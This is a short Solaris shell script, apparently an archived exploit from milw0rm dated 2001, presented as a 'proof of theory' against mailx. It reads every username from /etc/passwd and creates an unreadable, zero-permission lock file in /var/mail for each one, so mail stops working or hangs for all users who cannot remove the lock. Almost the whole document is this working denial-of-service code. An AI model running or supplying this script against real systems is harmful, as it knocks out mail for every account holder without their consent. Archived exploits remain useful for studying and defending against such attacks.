#!/bin/sh
#
# Solaris mailx(1) username.lock  proof of theory
# makes mailx not work for all users except those
# that  can erase the lockfile even so mailx will
# hang for a long time.
#
# Tested on Solaris 2.6, 7, 8
#
# by Optyx <optyx@uberhax0r.net>
# http://www.uberhax0r.net

echo "mailx-lock by optyx. http://www.uberhax0r.net"
for x in `cat /etc/passwd | cut -d':' -f1`;do
touch /var/mail/$x.lock
chmod 0 /var/mail/$x.lock
done


# milw0rm.com [2001-01-03]
